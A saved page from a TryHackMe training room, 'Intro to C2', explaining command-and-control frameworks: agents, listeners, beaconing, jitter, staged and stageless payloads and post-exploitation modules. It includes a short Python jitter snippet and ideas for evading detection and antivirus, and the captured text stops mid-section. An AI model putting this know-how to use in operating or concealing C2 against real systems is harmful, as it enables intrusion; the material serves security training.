<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Intro to C2_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Intro to C2_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Intro to C2_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Intro to C2_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/introtoc2#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Intro to C2_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Intro to C2_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Intro to C2_files/notifications.js"></script>
<script src="./TryHackMe _ Intro to C2_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Intro to C2_files/43708203c642f258f7c78e1a706e4d0f.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">653</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Intro to C2_files/89152d71d2f69101482059abb33f5992.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Intro to C2</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/introtoc2#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/introtoc2#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/introtoc2" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Intro to C2_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Learn the essentials of Command and Control to help you become a better Red Teamer and simplify your next Red Team assessment!</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/introtoc2#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/introtoc2#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/introtoc2#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/introtoc2#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/introtoc2#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-medium">Medium</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/6227af683ca9df0043e50e26">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 20369 users are in here and this room is 496 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Intro to C2_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Intro to C2_files/8110073ead81bd5ce12c5a956b18af06.jpg"> 
        <a class="green-link" href="https://tryhackme.com/p/l000g1c">l000g1c</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-danger" role="progressbar" style="width: 35%; aria-valuemin=" 0"="" aria-valuemax="100"> 35%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1" aria-expanded="true">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>Welcome to Intro to C2&nbsp;</h3><p><span style="font-size:1rem"><span>Command and Control (<a class="AcfVGwWJ glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;AcfVGwWJ&#39;)">C2</a>) Frameworks are an essential part of both Red Teamers and Advanced Adversaries playbooks. They make it both easy to manage compromised devices during an engagement and often help aid in lateral movement.</span></span></p>
<h3>Room Objectives</h3>
<p>In this room, we will learn about Command and Control Frameworks in-depth to gain a better understanding of the following topics:</p>
<ul>
<li>How a Command and Control Framework operates</li>
<li>The various components that you may use.</li>
<li>How to set up a basic Command and Control Framework </li><li>Use Armitage <b>or&nbsp;</b>Metasploit to gain familiarity with a Command and Control Framework</li>
<li>How to administer a Command and Control Framework</li>
<li><span><a class="ZkZeROA6 glossary-term" onclick="initPopOver(&#39;OPSEC&#39;, &#39;ZkZeROA6&#39;)">OPSEC</a> Considerations while administering a Command and Control Framework</span></li><li>And much more!</li>
</ul>
<p><span style="font-size:1.75rem">Room Prerequisites</span><br></p>
<ul>
<li>General experience with the Metasploit Framework, for more information, see the <a href="https://tryhackme.com/module/metasploit">Metasploit Module</a>.</li>
<li>General familiarity with Red Teaming; for more information, see the <a href="https://tryhackme.com/room/redteamfundamentals" target="_blank">Red Team Fundamentals</a> room.</li>
<li>General familiarity with exploiting vulnerable virtual machines.</li>
</ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the task above!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Command and Control Framework Structure
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>What is a Command and Control Framework</h3><p><span>While trying to digest the various components of a <a class="Sf5DLhMk glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;Sf5DLhMk&#39;)">C2</a> framework, it may be intimidating. However, they don’t have to be. In order to better understand what a C2 framework is at its most basic level, think of a Netcat listener (the C2 server) that is capable of handling many reverse shells calling back at once (C2 Agents). It’s a server but for reverse shells. Unlike Netcat, almost all C2 frameworks require a special payload generator. This is usually a feature that is built into the framework itself. For example, Metasploit is a C2 Framework that has its own payload generator, MSFVenom.</span></p><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/661abd734022d8a1f3050e90d3fb6861.png"><img></p><p style="text-align:center"><i><span>The Diagram above depicts three compromised clients calling back to a <a class="BLR7vp16 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;BLR7vp16&#39;)">C2</a> Server.</span><br></i></p><p><span style="font-size:1rem"><span>So what exactly makes <a class="SFtD14qz glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;SFtD14qz&#39;)">C2</a> frameworks better than a normal Netcat listener? It seems like all someone needs to do is implement session management into Netcat, and you have the same thing? While this is true, C2 frameworks shine in their “Post Exploitation” features.</span></span></p><h3><span style="font-size:1.75rem">Command and Control Structure</span><br></h3>
<h3><span style="font-size:16px"><b><span><a class="hK5KQF6P glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;hK5KQF6P&#39;)">C2</a> Server</span></b></span></h3><span style="font-size:16px"><b>
</b></span><p><span>In order to understand a Command and Control framework, we must first start by understanding the various components of a <a class="90bkjcn0 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;90bkjcn0&#39;)">C2</a> server. Let’s start with the most essential component - The C2 Server itself</span><span style="font-size:1rem"><span>. The <a class="L7rM2tKg glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;L7rM2tKg&#39;)">C2</a> Server serves as a hub for agents to call back to. Agents will periodically reach out to the C2 server and wait for the operator’s commands.</span></span></p><span style="font-size:16px">
</span><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/5de5e62c5ba37013302790062b6b429e.png"><br></p><p style="text-align:center"><i><span>This screenshot depicts a basic <a class="1Va0kaUk glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;1Va0kaUk&#39;)">C2</a> server diagram.</span></i></p><p style="text-align:center"><i><br></i></p><span style="font-size:16px">
</span><h3><span style="font-size:16px"><b>Agents / Payloads</b></span></h3><span style="font-size:16px"><b>
</b></span><p><span>An agent is a program generated by the <a class="J1nTd5N2 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;J1nTd5N2&#39;)">C2</a> framework that calls back to a listener on a C2 server. Most of the time, this agent enables special functionality compared to a standard reverse shell. Most C2 Frameworks implement pseudo commands to make the C2 Operator’s life easier. Some examples of this may be a pseudo command to Download or Upload a file onto the system. It’s important to know that agents can be highly configurable, with adjustments on the timing of how often C2 Agents beacon out to a Listener on a C2 Server and much more.</span></p><span style="font-size:16px">
</span><h3><span style="font-size:16px"><b>Listeners</b></span></h3><span style="font-size:16px"><b>
</b></span><p><span>On the most basic level, a listener is an application running on the <a class="hqOdl8XD glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;hqOdl8XD&#39;)">C2</a> server that waits for a callback over a specific port or protocol.  Some examples of this are DNS, HTTP, and or HTTPS.</span></p><span style="font-size:16px">
</span><h3><span style="font-size:16px"><b>Beacons</b></span></h3><span style="font-size:16px"><b>
</b></span><p><span>A Beacon is the process of a <a class="hQWwyLvv glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;hQWwyLvv&#39;)">C2</a> Agent calling back to the listener running on a C2 Server.</span></p><p><br></p><span style="font-size:16px">
</span><h3>Obfuscating Agent Callbacks</h3><h3><b style="font-size:1rem">Sleep Timers</b><br></h3><span style="font-size:16px">
</span><p><span>One key thing that some security analysts, anti-virus, and next-generation firewalls look for when attempting to identify Command and Control traffic is beaconing and the rate at which a device beacons out to a <a class="Xk9mfrlh glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;Xk9mfrlh&#39;)">C2</a> server. Let’s say a firewall observed traffic that looks like so</span></p><span style="font-size:16px">
</span><ul>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:05.000</li>
<li>TCP/443 - Session Duration 2s, 33 packets sent, 10:00:10.000</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:15.000</li>
<li>TCP/443 - Session Duration 1s, 33 packets sent, 10:00:20.000</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:25.000</li>
</ul><span style="font-size:16px">
</span><p>A pattern is starting to form. The agent beacons out every 5 seconds; this means that it has a sleep timer of 5 seconds.</p><span style="font-size:16px">
</span><p><b>Jitter</b></p><p><span>Jitter takes the sleep timer and adds some variation to it; our <a class="jp54fKhf glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;jp54fKhf&#39;)">C2</a> beaconing may now exhibit a strange pattern that may show activity that is closer to an average user:</span></p><span style="font-size:16px">
</span><ul>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:03.580</li>
<li>TCP/443 - Session Duration 2s, 33 packets sent, 10:00:13.213</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:14.912</li>
<li>TCP/443 - Session Duration 1s, 33 packets sent, 10:00:23.444</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:27.182</li>
</ul><span style="font-size:16px">
</span><p><span>The beaconing is now set at a semi-irregular pattern that makes it slightly more difficult to identify among regular user traffic. In more advanced <a class="baON2uas glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;baON2uas&#39;)">C2</a> frameworks, it may be possible to alter various other parameters, like “File” jitter or adding junk data to the payload or files being transmitted to make it seem larger than it actually is.</span></p><p>Sample Python3 code for Jitter may look like so:</p><p><code>import random</code></p><p><code>sleep = 60</code></p><p><code>jitter = random.randint(-30,30)</code></p><p><code>sleep = sleep + jitter<br></code><br></p><p>It's important to note that this is a fundamental example,&nbsp; but it can be much more math-heavy, setting upper bounds and lower bounds, taking percentages of last sleep, and building on from there. Because this is an introduction room, we will spare you a complicated formula.</p><p><br></p><span style="font-size:16px">
</span><h3>Payload Types</h3><span style="font-size:16px">
</span><p><span>Much like a regular Reverse Shell, there are two primary types of payloads that you may be able to use in your <a class="s4olTBL0 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;s4olTBL0&#39;)">C2</a> Framework; </span><strong>Staged</strong> and <strong>Stageless</strong> payloads.</p><span style="font-size:16px">
</span><p><strong>Stageless Payloads</strong></p><span style="font-size:16px">
</span><p><span>Stageless Payloads are the simplest of the two; they contain the full <a class="kYXS2F31 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;kYXS2F31&#39;)">C2</a> agent and will call back to the C2 server and begin beaconing immediately. You can refer to the diagram below to gain a better understanding of how Stageless payloads operate.</span></p><span style="font-size:16px">
</span><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/e79d46d97f108842b9424ae5a134d2f8.png"></p><p style="text-align:center"><i><span>This screenshot depicts a stageless payload calling back to a <a class="vawHNr8l glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;vawHNr8l&#39;)">C2</a> server</span></i></p><span style="font-size:16px">
</span><div><span>The steps for establishing <a class="h8J1zsPh glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;h8J1zsPh&#39;)">C2</a> beaconing with a Stageless payload are as follows:</span></div><div><span style="font-size:1rem"><br></span></div><div><span style="font-size:1rem"><span style="font-weight:bolder">1.</span>&nbsp;The Victim downloads and executes the Dropper</span><br></div><div><span style="font-weight:bolder">2.</span><span>&nbsp;The beaconing to the <a class="ZJ3f1fkp glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;ZJ3f1fkp&#39;)">C2</a> Server begins</span></div><div><br></div><p><strong>Staged Payloads</strong></p><span style="font-size:16px">
</span><p><span>Staged payloads require a callback to the <a class="4ck5XKfU glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;4ck5XKfU&#39;)">C2</a> server to download additional parts of the C2 agent. This is commonly referred to as a “Dropper” because it is “Dropped” onto the victim machine to download the second stage of our staged payload.  This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.</span></p><p><br><img style="text-align:center;font-size:1rem"><img src="./TryHackMe _ Intro to C2_files/e6127ac6a295a1d9b01444757f711084.png"></p><p style="text-align:center"><i><span>This diagram depicts a dropper calling back to a <a class="hxwJ5RMJ glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;hxwJ5RMJ&#39;)">C2</a> server for its second stage.</span></i></p><p style="text-align:center"></p><div style="text-align:left"><span>The steps for establishing <a class="U6PKAvRF glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;U6PKAvRF&#39;)">C2</a> beaconing with a Staged payload are as follows:</span></div><div style="text-align:left"><span style="font-size:1rem"><br></span></div><div style="text-align:left"><span style="font-size:1rem"><b>1.</b> The Victim downloads and executes the Dropper</span><br></div><div><b>2.</b><span> The Dropper calls back to the <a class="93CmZVmA glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;93CmZVmA&#39;)">C2</a> Server for Stage 2</span></div><div><b>3.</b><span> The <a class="vxBYlPjo glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;vxBYlPjo&#39;)">C2</a> Server sends Stage 2 back to the Victim Workstation</span></div><div><b>4. </b>Stage 2 is loaded into memory on the Victim Workstation&nbsp;</div><div><b>5.</b><span>&nbsp;<a class="JunSW2YS glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;JunSW2YS&#39;)">C2</a> Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.</span></div><div><br></div><p></p><span style="font-size:16px">
</span><h3>Payload Formats</h3><span style="font-size:16px">
</span><p><span>As you may know, Windows PE files (Executables) are not the only way to execute code on a system.  Some <a class="paxL9gY6 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;paxL9gY6&#39;)">C2</a> Frameworks support payloads in various other formats, for example:</span></p><span style="font-size:16px">
</span><ul>
<li><span><a class="ClKMU26n glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;ClKMU26n&#39;)">PowerShell</a> Scripts
</span><ul>
<li>Which may contain C# Code and may be compiled and executed with the Add-Type commandlet</li>
</ul>
</li>
<li><span><a class="Htlt2wj9 glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;Htlt2wj9&#39;)">HTA</a> Files</span></li>
<li>JScript Files</li>
<li>Visual Basic Application/Scripts</li>
<li>Microsoft Office Documents</li>
</ul><span style="font-size:16px">
</span><p>and many more. For more information on various other payload formats, you should review the <a href="https://tryhackme.com/room/weaponization">Weaponization</a> room in the Initial Access module.</p><p><br></p><span style="font-size:16px">
</span><h3>Modules</h3><span style="font-size:16px">
</span><p><span>Modules are a core component of any <a class="BUBrOQkr glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;BUBrOQkr&#39;)">C2</a> Framework; they add the ability to make agents and the C2 server more flexible. Depending on the C2 Framework, scripts must be written in different languages. Cobalt Strike has “Aggressor Scripts”, which are written in the “Aggressor Scripting Language”. PowerShell Empire has support for multiple languages, Metasploit’s Modules are written in Ruby, and many others are written in many other languages.</span></p><span style="font-size:16px">
</span><h3><span style="font-size:16px"><b>Post Exploitation Modules</b></span></h3><span style="font-size:16px"><b>
</b></span><p>Post Exploitation modules are simply modules that deal with anything after the initial point of compromise, this could be as simple as running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory. For more information on Post Exploitation, refer to the <a href="https://tryhackme.com/room/postexploit">Post Exploitation Basics</a> room.</p><span style="font-size:16px">
</span><h3><span style="font-size:16px"><b>Pivoting Modules</b></span></h3><span style="font-size:16px"><b>
